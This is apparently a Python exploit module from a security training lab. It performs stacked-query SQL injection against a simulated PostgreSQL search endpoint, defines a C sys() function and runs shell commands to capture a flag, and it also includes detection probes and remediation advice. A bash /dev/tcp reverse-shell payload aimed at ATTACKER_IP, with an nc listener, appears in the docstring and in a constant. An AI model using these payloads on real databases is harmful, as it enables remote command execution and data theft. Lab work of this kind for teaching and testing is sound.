r"""PostgreSQL UDF reverse shell via stacked-query injection (C ``sys(text)``).

WHAT IT IS
----------
PostgreSQL's *simple query* protocol path lets one query string carry **multiple
statements separated by ``;``** ("stacked queries"). When an application splices
untrusted input into a query run on that path, the attacker is no longer confined
to the one ``SELECT`` -- they can *append whole new statements*, including DDL.
The classic weaponisation is a **C user-defined function**: define a SQL function
backed by native code that wraps ``system(3)``, then call it. Once defined,
``SELECT sys('<cmd>')`` runs ``<cmd>`` on the server as the database service
account -- an arbitrary-command primitive reachable from a single GET parameter::

    -- 1) define the UDF (points at an attacker-provided / already-present .so)
    CREATE FUNCTION sys(text) RETURNS text AS '/lib/x.so','sys' LANGUAGE 'c';
    -- 2) call it interactively, one OS command per request
    SELECT sys('id');
    SELECT sys('uname -a');
    SELECT sys('cat secret/udf_shell_flag.txt');

That ``sys(text)`` UDF is the **reverse-shell primitive**. In a real engagement
the operator does not run one command at a time -- they call it ONCE with a bash
reverse shell that dials back to a listener they control, e.g.::

    SELECT sys('bash -c "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"');
    #   attacker side:  nc -lvnp 4444   -> an interactive shell as `postgres`

...turning the stateless ``SELECT sys('<cmd>')`` round-trips into a single
persistent TTY. This module demonstrates the *interactive-shell* shape of that
same primitive: it defines ``sys`` once, then drives a short command sequence
(``id`` -> ``uname -a`` -> ``cat secret/udf_shell_flag.txt``) exactly as an
operator would type into a freshly-caught shell, and recovers the planted
``C.FLAGS["udf_reverse_shell"]`` from the final ``cat``'s output.

The demo's sink is the textbook mistake -- user input concatenated into a query
the (PostgreSQL) backend runs on the stacked-query path::

    def _pg_search(h):                                      # GET /pg/search?q=<v>
        q = h._query().get("q", "")
        sql = f"SELECT name FROM products WHERE name ILIKE '%{q}%'"  # injectable
        result = h.state.pg.execute(sql)                   # PG: stacked ; allowed
        h._send_json(200, result)                          # {rows, outputs, notices}

Because ``q`` is concatenated raw, a value that closes the string literal with a
``'`` and adds ``; <statement> -- `` injects a second statement. A benign
``q=keyboard`` returns ``outputs: []`` (the lone SELECT produces no command
output); each injected ``SELECT sys('<cmd>')`` makes ``outputs`` (and ``rows``)
carry the *stdout of an OS command*.

NOTE: the lab uses a *simulated* PostgreSQL
(:class:`weblab.targetapp.pg_sim.PgSim`). It faithfully reproduces the
attacker-relevant surface -- stacked-query splitting that respects single-quoted
strings, ``CREATE FUNCTION ... LANGUAGE C`` + call -- and routes "command
execution" through the sandboxed :func:`simulate_shell`. The injection mechanics
(string break-out, statement stacking, defining-then-calling the C UDF) are real
and observable; no real ``psql`` / ``system()`` is ever invoked on the host, and
no socket dials out -- the "reverse shell" is the UDF primitive, demonstrated as
an interactive command sequence rather than a literal outbound TTY.

HOW WE DISCOVER IT
------------------
Layered, differential signals, each keyed on *command output* rather than a page
substring:

1.  **The benign baseline.** ``q=keyboard`` returns HTTP 200 with a parseable
    ``{rows, outputs, notices}`` JSON and an EMPTY ``outputs`` -- the lone SELECT
    runs no OS command. This anchors what "no injection" looks like and proves the
    JSON contract the detector parses.
2.  **UDF break-out with a random sentinel.** We define ``sys`` and call it with
    ``echo <random-canary>`` in one stacked request:
    ``x' ; CREATE FUNCTION sys(text) ... LANGUAGE 'c' ; SELECT sys('echo <canary>') -- ``.
    A backend that does NOT honour stacked queries (MySQL/SQLite via most drivers)
    would error or ignore the tail; PostgreSQL on the simple-query path defines the
    function and runs it, and the canary appears in ``outputs`` on its own. The
    token is random per run, so a page that merely contains a common word cannot
    masquerade as a vulnerable sink -- this is the "stacked queries are allowed AND
    the C UDF executes" proof.

HOW WE EXPLOIT IT
-----------------
We treat the ``sys`` UDF as an interactive shell. After defining it once, we run a
realistic operator sequence (``id`` to confirm execution context, ``uname -a`` for
host recon, then read the prize), recovering the flag from the final ``cat``::

    q = "x' ; CREATE FUNCTION sys(text) RETURNS text AS '/lib/x.so','sys' "
        "LANGUAGE 'c' ; SELECT sys('cat secret/udf_shell_flag.txt') -- "

Each ``SELECT sys('<cmd>')`` makes the simulated PG run ``<cmd>`` and place its
stdout in ``outputs`` (and as a ``rows`` entry). The final command's stdout is the
planted ``C.FLAGS["udf_reverse_shell"]``. In the real world this same primitive is
called once with a bash reverse shell to an attacker listener, giving a persistent
interactive shell as the database service account -- then pivots into the internal
network, reads ``.pgpass`` / config / every secret the postgres user can reach.

THE FIX
-------
See :data:`REMEDIATION`. In one line: use **parameterised queries / prepared
statements** so input can never become SQL, disable multi-statement execution, run
PostgreSQL as a **least-privilege, non-superuser** role, and deny untrusted
``CREATE FUNCTION ... LANGUAGE C`` (the C-UDF reverse-shell primitive needs it).
"""
from __future__ import annotations

import uuid
from typing import Any, Dict, List, Optional, Tuple

from ._types import Finding, Response, Severity
from .http_client import WebClient
from .targetapp import constants as C

REMEDIATION: str = (
    "Fix the root cause -- untrusted input concatenated into SQL -- with "
    "PARAMETERISED QUERIES / prepared statements (e.g. psycopg "
    "cur.execute('SELECT name FROM products WHERE name ILIKE %s', (pattern,)) "
    "with the '%'..'%' wrapping done in code, or PDO/parameterised commands in "
    "PHP/.NET). Parameter binding makes the input a VALUE that can never close the "
    "string literal or add a statement, which kills both the SELECT subversion AND "
    "the stacked-query escalation to a CREATE FUNCTION. Defence in depth that "
    "specifically blunts the C-UDF reverse-shell primitive: (1) Do NOT run the "
    "application as a PostgreSQL SUPERUSER -- CREATE FUNCTION ... LANGUAGE C (and "
    "COPY ... TO/FROM PROGRAM) require superuser; a least-privilege role with only "
    "SELECT/INSERT/UPDATE on its own tables cannot define a C function at all. "
    "(2) Disable multi-statement execution: avoid the simple-query path / drivers "
    "that allow stacked queries, send exactly one statement per execute, and reject "
    "input containing statement terminators at the app layer as a backstop (never "
    "as the primary control). (3) Lock down extensions and native code: forbid "
    "untrusted C extensions, restrict the extension allow-list, keep library "
    "directories non-world-writable, and never let the postgres OS account write to "
    "a directory it can also load .so files from -- the UDF needs an attacker-"
    "controllable shared object on disk. (4) Apply least privilege to the postgres "
    "OS account (sandbox/seccomp/AppArmor), EGRESS-FILTER the database host so a "
    "reverse shell cannot dial out to an attacker listener, network-segment the DB, "
    "and monitor for CREATE FUNCTION ... LANGUAGE 'c' and unexpected outbound "
    "connections from the DB host. (5) Use an ORM/query builder consistently and "
    "add a WAF/allow-list as additional layers. Parameterise everything, drop "
    "superuser, forbid C UDFs, and block the DB host's outbound network."
)

#: The injectable sink, used as the Finding endpoint.
ENDPOINT: str = "/pg/search?q="

#: A benign search term: the lone SELECT runs, ``outputs`` stays empty (no OS
#: command executed). The control that anchors what "no injection" looks like.
BENIGN_QUERY: str = "keyboard"

#: The SQL fragment that defines the C UDF reverse-shell primitive once. Backed by
#: a native ``.so`` exporting ``sys`` -- in a real attack the attacker plants this
#: object (or points at an already-present one). After this runs, ``SELECT
#: sys('<cmd>')`` executes ``<cmd>`` as the database service account.
DEFINE_UDF: str = (
    "CREATE FUNCTION sys(text) RETURNS text AS '/lib/x.so','sys' LANGUAGE 'c'"
)

#: The interactive shell session we drive through the ``sys`` UDF, in order: prove
#: execution context, recon the host, then read the planted flag. This is exactly
#: what an operator types into a freshly-caught shell.
SHELL_SEQUENCE: List[str] = ["id", "uname -a", "cat secret/udf_shell_flag.txt"]

#: The OS command whose stdout carries the planted reverse-shell-proof flag.
EXPLOIT_CMD: str = "cat secret/udf_shell_flag.txt"

#: The single-request payload that defines the UDF and reads the flag (the headline
#: ``payload`` reported by the Finding).
UDF_PAYLOAD: str = (
    f"x' ; {DEFINE_UDF} ; SELECT sys('{EXPLOIT_CMD}') -- "
)

#: A representative bash reverse-shell call -- the REAL weaponisation of the same
#: ``sys`` UDF (dials back to an attacker listener for a persistent TTY). We never
#: actually fire this against the lab (no socket dials out); it is documented and
#: published so the report shows the true intent of the primitive.
REVERSE_SHELL_PAYLOAD: str = (
    "x' ; " + DEFINE_UDF + " ; "
    "SELECT sys('bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"') -- "
)


def _shell_payload(cmd: str) -> str:
    """Build a stacked payload that defines ``sys`` then runs ``<cmd>`` through it.

    Closes the ILIKE string literal (``x'``), stacks the CREATE FUNCTION that
    defines the C UDF, then a ``SELECT sys('<cmd>')`` call, and comments out the
    trailing ``%'`` the application appends. One such request == one shell command.
    """
    return f"x' ; {DEFINE_UDF} ; SELECT sys('{cmd}') -- "


#: Every payload the engine submits (public so the CLI / report can show exactly
#: what was attempted): one define-then-run payload per shell command, plus the
#: documented (never-fired) bash reverse-shell weaponisation.
PAYLOADS: List[str] = [_shell_payload(c) for c in SHELL_SEQUENCE] + [
    REVERSE_SHELL_PAYLOAD
]


# --- low-level probe ---------------------------------------------------------
def _search(client: WebClient, q: str) -> Response:
    """Request ``/pg/search?q=<q>`` (the client URL-encodes the value)."""
    return client.get("/pg/search", params={"q": q})


def _result(resp: Response) -> Optional[Dict[str, Any]]:
    """Parse the ``{rows, outputs, notices}`` JSON, or ``None`` if not parseable.

    The simulated PG always answers HTTP 200 with this shape; a malformed body or
    an ``{"error": ...}`` payload (a query the backend rejected) yields ``None``
    for the detectors/exploit, which key on the ``outputs`` channel.
    """
    if resp.status != 200:
        return None
    try:
        body = resp.json()
    except ValueError:
        return None
    if not isinstance(body, dict):
        return None
    if "outputs" not in body or "rows" not in body:
        return None
    return body


def _outputs_text(result: Optional[Dict[str, Any]]) -> str:
    """Flatten ``outputs`` (the command-output channel) to a single string."""
    if not result:
        return ""
    return "\n".join(str(o) for o in result.get("outputs", []))


# --- detection ---------------------------------------------------------------
def detect_baseline(client: WebClient) -> Tuple[bool, str]:
    """True if a benign search returns the JSON contract with EMPTY ``outputs``.

    The control: ``q=keyboard`` runs only the intended SELECT, so no OS command
    runs and ``outputs`` is empty. Confirms the ``{rows, outputs, notices}``
    contract the detector/exploit parse and anchors the "no injection" baseline.
    """
    resp = _search(client, BENIGN_QUERY)
    result = _result(resp)
    if result is not None and not result.get("outputs"):
        return True, (
            f"GET {ENDPOINT}{BENIGN_QUERY} returned a parseable "
            "{rows, outputs, notices} result with an EMPTY outputs channel "
            "(HTTP 200) -- the lone SELECT ran no OS command (baseline)"
        )
    return False, ""


def detect_udf_shell(client: WebClient) -> Tuple[bool, str]:
    """True if a stacked ``CREATE FUNCTION sys`` + ``SELECT sys('echo <canary>')`` runs.

    Defines the C UDF and immediately calls it with ``echo <random-token>`` in one
    stacked request. A backend that does not honour stacked queries would error or
    ignore the tail; PostgreSQL on the simple-query path defines ``sys`` and runs
    it, so the canary lands in ``outputs`` on its own. The token is random per call,
    so a static page word cannot masquerade as a vulnerable sink -- this proves both
    "stacked queries are allowed" AND "the C UDF executes", the reverse-shell
    primitive that distinguishes PG UDF RCE from a single-statement backend.
    """
    canary = "weblab-udfshell-" + uuid.uuid4().hex[:12]
    payload = _shell_payload(f"echo {canary}")
    result = _result(_search(client, payload))
    outputs = result.get("outputs", []) if result else []
    token_isolated = any(str(o).strip() == canary for o in outputs)
    if token_isolated:
        return True, (
            f"GET {ENDPOINT}{payload} stacked CREATE FUNCTION sys(text) LANGUAGE C "
            f"then SELECT sys('echo {canary}') and returned the random token "
            f"{canary!r} in outputs -- PostgreSQL honoured the `;`, defined the C "
            "UDF, and executed it (the reverse-shell primitive)"
        )
    return False, ""


# --- exploitation ------------------------------------------------------------
def run_shell_command(
    client: WebClient, cmd: str
) -> Tuple[str, str, Optional[Dict[str, Any]]]:
    """Run one OS command through the ``sys`` UDF as if typed into a shell.

    Sends a single ``x' ; CREATE FUNCTION sys ... ; SELECT sys('<cmd>') -- ``
    request and returns ``(cmd, output, result)`` where ``output`` is the command's
    stdout taken from the ``outputs`` channel and ``result`` is the parsed
    ``{rows, outputs, notices}``. (Re-defining ``sys`` each call is harmless -- the
    sim treats the function name as already present -- and keeps every request
    self-contained, mirroring stateless ``SELECT sys('<cmd>')`` round-trips.)
    """
    result = _result(_search(client, _shell_payload(cmd)))
    return cmd, _outputs_text(result), result


def exploit_interactive_shell(
    client: WebClient,
) -> Tuple[bool, Optional[str], List[Dict[str, Any]]]:
    """Drive the ``sys`` UDF as an interactive shell; recover the flag.

    Runs the operator sequence ``id`` -> ``uname -a`` -> ``cat <flag>`` through the
    C UDF and returns ``(ok, flag, session)`` where ``session`` is a per-command log
    of ``{cmd, output}`` and ``flag`` is the planted ``C.FLAGS["udf_reverse_shell"]``
    if it appears in any command's stdout (here, the final ``cat``). ``ok`` is True
    once the flag is recovered -- proof the UDF executed an OS command and returned
    its stdout, i.e. the reverse-shell primitive works.
    """
    session: List[Dict[str, Any]] = []
    flag: Optional[str] = None
    target = C.FLAGS["udf_reverse_shell"]
    for cmd in SHELL_SEQUENCE:
        _cmd, output, result = run_shell_command(client, cmd)
        session.append(
            {
                "cmd": cmd,
                "output": output,
                "rows": (result or {}).get("rows", []),
                "notices": (result or {}).get("notices", []),
            }
        )
        if target in output:
            flag = target
    return (flag is not None), flag, session


# --- the contract entry point ------------------------------------------------
def assess(client: WebClient) -> Finding:
    """Detect the PG stacked-query C-UDF, then drive it as an interactive shell.

    Returns a :class:`Finding` whose ``exploit_result`` contains the recovered
    ``C.FLAGS["udf_reverse_shell"]`` (from the final ``cat`` in the shell session)
    and records the full ``id`` -> ``uname -a`` -> ``cat`` session, with ``extra``
    carrying the machine-readable detail (baseline ok, UDF-shell confirmed, the
    documented bash reverse-shell weaponisation of the same primitive).
    """
    techniques: List[str] = []

    # 1) Detection ----------------------------------------------------------
    baseline_ok, baseline_ev = detect_baseline(client)
    if baseline_ok:
        techniques.append("benign-baseline")
    udf_ok, udf_ev = detect_udf_shell(client)
    if udf_ok:
        techniques.append("udf-shell-sentinel")

    # 2) Exploitation (interactive shell via the C UDF) ---------------------
    shell_ok, flag, session = exploit_interactive_shell(client)
    if shell_ok:
        techniques.append("interactive-udf-shell")

    # Discovery requires a confirmed UDF break-out AND the shell session to have
    # placed the flag in a command's stdout.
    discovered = bool(udf_ok and shell_ok)

    # 3) Assemble evidence / result ----------------------------------------
    evidence_parts: List[str] = []
    if baseline_ok:
        evidence_parts.append(f"baseline: {baseline_ev}")
    if udf_ok:
        evidence_parts.append(f"udf-shell: {udf_ev}")
    evidence = " || ".join(evidence_parts)

    # A readable transcript of the "interactive shell" the operator drove.
    transcript = "\n".join(
        f"sql> SELECT sys('{step['cmd']}');\n{step['output']}" for step in session
    )

    exploit_result: Dict[str, Any] = {
        "flag": flag,
        "payload": UDF_PAYLOAD,
        "define_udf": DEFINE_UDF,
        "exploit_cmd": EXPLOIT_CMD,
        "shell_sequence": SHELL_SEQUENCE,
        "session": session,
        "transcript": transcript,
        "reverse_shell_payload": REVERSE_SHELL_PAYLOAD,
        "techniques": techniques,
        "summary": (
            f"GET {ENDPOINT} on a PostgreSQL backend allowed STACKED queries; we "
            "defined a C UDF sys(text) (the reverse-shell primitive) and drove it as "
            f"an interactive shell ({' -> '.join(SHELL_SEQUENCE)}). The final command "
            f"returned flag {flag!r} via result['outputs'] -- a SQLi -> interactive "
            "OS shell as the database service account. A real attack calls the same "
            "sys() UDF once with a bash reverse shell to an attacker listener for a "
            "persistent TTY."
        ),
    }

    return Finding(
        vuln="PostgreSQL UDF reverse shell (stacked queries -> C sys() UDF)",
        endpoint=ENDPOINT,
        severity=Severity.CRITICAL.value,
        discovered=discovered,
        evidence=evidence,
        exploit_result=exploit_result,
        remediation=REMEDIATION,
        payload=UDF_PAYLOAD,
        extra={
            "techniques": techniques,
            "benign_baseline_ok": baseline_ok,
            "udf_shell_confirmed": udf_ok,
            "interactive_shell_ok": shell_ok,
            "flag_recovered": shell_ok,
            "commands_run": [s["cmd"] for s in session],
            "define_udf": DEFINE_UDF,
            "udf_payload": UDF_PAYLOAD,
            "reverse_shell_payload": REVERSE_SHELL_PAYLOAD,
            "exploit_cmd": EXPLOIT_CMD,
            "breakout": "' ; <statement> -- ",
        },
    )
